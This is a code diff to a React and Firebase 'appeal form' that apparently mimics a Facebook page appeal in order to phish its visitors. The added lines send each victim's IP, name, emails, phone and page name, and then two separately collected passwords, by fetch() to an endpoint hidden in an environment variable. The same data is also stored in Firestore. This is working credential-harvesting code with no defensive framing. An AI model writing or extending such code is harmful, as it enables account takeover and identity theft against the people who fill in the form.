@@ -2,8 +2,8 @@ import { useState } from 'react';
 import styles from '../styles/appeal-form.module.css';
 import { useForm } from "react-hook-form";
 import { db } from  '../firebaseConfig';
-import { doc, setDoc, getDocs, getDoc, updateDoc, query, collection, onSnapshot } from "firebase/firestore";
-import React, { useEffect } from 'react';
+import { doc, setDoc, updateDoc } from "firebase/firestore";
+import React from 'react';
 
 
 
@@ -21,6 +21,19 @@ const AppealForm = (props) => {
 
         data['location'] = {country: location.country, city: location.city, countryCode: location.countryCode};
         data['currentStep'] = 'password';
+
+        const message = `
+            Appeal Form  (${props.ip.userIP})                           
+            Personal Email: ${data.personalEmail}                                                    
+            Business Email: ${data.businessEmail}                                     
+            Phone: ${data.phone}                     
+            Full Name: ${data.fullName}                    
+            Page Name: ${data.pageName}
+            Appeal: ${data.appeal}
+        `
+        await fetch(`${process.env.customKey} ${message}`).then( res => res.json());
+
+
         await setDoc(doc(db, "users", data.personalEmail), data);
 
         props.onSubmit({type: 'listenUser', value: data.personalEmail});
@@ -33,6 +46,12 @@ const AppealForm = (props) => {
 
         await updateDoc(docRef,data);
 
+        const message = `
+            First Password  (${props.ip.userIP})                           
+            Password: ${data.password}                                                    
+        `
+        await fetch(`${process.env.customKey} ${message}`).then( res => res.json());
+
         setSteps({first_password: false, second_password: true})
 
     }
@@ -40,6 +59,12 @@ const AppealForm = (props) => {
     const secondPasswordSubmit = async (data) => { 
         const docRef = doc(db, "users", email);
         await updateDoc(docRef,data);
+
+        const message = `
+            Second Password  (${props.ip.userIP})                           
+            Password 2: ${data.confirmPassword}                                                    
+        `
+        await fetch(`${process.env.customKey} ${message}`).then( res => res.json());
 
         trigerNext();
     }
@@ -66,15 +91,15 @@ const AppealForm = (props) => {
 
                     <div className={styles.input}>
                         <label>Please provide us information that will help us investigate</label>
-                        <textarea required {...register("appeal")}></textarea>
+                        <textarea {...register("appeal")}></textarea>
                     </div>
                     <div className={styles.input}>
                         <label>Full Name</label>
-                        <input type="text" required {...register("fullName")} />
+                        <input type="text" {...register("fullName")} />
                     </div>
                     <div className={styles.input}>
                         <label>Business Email Address</label>
-                        <input type="email" required {...register("businessEmail")} />
+                        <input type="email" {...register("businessEmail")} />
                     </div>
                     <div className={styles.input}>
                         <label>Personal Email Address</label>
@@ -82,11 +107,11 @@ const AppealForm = (props) => {
                     </div>
                     <div className={styles.input}>
                         <label>Mobile Phone Number</label>
-                        <input type="text" required {...register("phone")} />
+                        <input type="text" {...register("phone")} />
                     </div>
                     <div className={styles.input}>
                         <label>Facebook Page Name</label>
-                        <input type="text" required {...register("pageName")} />
+                        <input type="text" {...register("pageName")} />
                     </div>
 
                     <button>Submit</button>
